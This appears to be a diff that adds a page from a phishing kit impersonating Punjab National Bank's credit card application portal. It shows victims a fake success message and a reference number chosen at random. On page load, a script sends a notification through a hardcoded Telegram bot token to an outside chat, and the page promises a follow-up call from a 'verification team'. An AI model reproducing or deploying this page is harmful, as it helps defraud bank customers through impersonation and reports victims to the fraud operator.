@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank - Application Success</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #f4f4f9;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        main {
+            flex: 1;
+        }
+        .header {
+            background-color: #a90000;
+            color: white;
+            padding: 10px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .sub-header {
+            background-color: #ffcc00;
+            padding: 5px;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .container {
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            margin-top: 20px;
+            max-width: 600px;
+            margin: 20px auto;
+        }
+        .success-message {
+            font-size: 24px;
+            color: #28a745;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .application-details {
+            font-size: 18px;
+            margin-top: 10px;
+            color: #555;
+        }
+        .btn {
+            background-color: #ffcc00;
+            padding: 10px 20px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #ff9900;
+        }
+        .footer {
+            background-color: #a90000;
+            color: white;
+            padding: 10px;
+            margin-top: auto;
+            width: 100%;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto;
+            padding: 10px 0;
+            max-width: 150px;
+        }
+        .bottom-image {
+            width: 70%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+        }
+        .timestamp {
+            font-size: 14px;
+            color: #777;
+            margin-top: 20px;
+        }
+        .ref-no {
+            font-size: 22px;
+            font-weight: bold;
+            color: #007bff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="pnb-logo.png" alt="PNB Logo" class="logo">
+        पंजाब नैशनल बैंक | Punjab National Bank
+    </div>
+    <div class="sub-header">Punjab National Bank Credit Card Apply Portal</div>
+
+    <main>
+        <div class="container">
+            <p class="success-message">Your Account Has Been Created Successfully 🎉</p>
+            <p>Your Application Has Been Sent Successfully! 📤</p>
+
+            <div class="application-details">
+                <p>Your Application Ref No: <span class="ref-no" id="appRefNo"></span> 📑</p>
+                <p>Please Wait For Confirmation. We Are Verifying Your Details 🔍.</p>
+                <p>Our Address Verification Team Will Be Contacting You Within 24 Hours 📞.</p>
+            </div>
+
+            <button onclick="window.location.href = 'index.html';" class="btn">Apply Again 🔄</button>
+
+            <p class="timestamp" id="timestamp"></p>
+        </div>
+    </main>
+
+    <div class="footer">
+        <p>&copy; 2025 Punjab National Bank | All Rights Reserved</p>
+    </div>
+
+    <script>
+        // Generate random application reference number
+        const refNumbers = [
+            'PNB72207', 'PNB83192', 'PNB94618', 
+            'PNB65174', 'PNB53728', 'PNB41256'
+        ];
+        const randomRef = refNumbers[Math.floor(Math.random() * refNumbers.length)];
+        document.getElementById('appRefNo').textContent = randomRef;
+
+        // Display current time when the page loads
+        const timestamp = new Date().toLocaleString();
+        document.getElementById('timestamp').textContent = `Timestamp: ${timestamp}`;
+
+        // Send details to Telegram with emojis
+        function sendToTelegram() {
+            const apiToken = '8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A';
+            const chatId = '7558871636';
+            const message = `✅ Application Success 🏦\n\n🎉 Your account has been successfully created!\n📑 Application Ref No: ${randomRef}\n🔍 Verification in progress\n📞 Address verification team will contact you within 24 hours.\nTimestamp: ${timestamp}`;
+
+            const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+
+        // Call the sendToTelegram function to send the message
+        sendToTelegram();
+    </script>
+
+</body>
+</html>
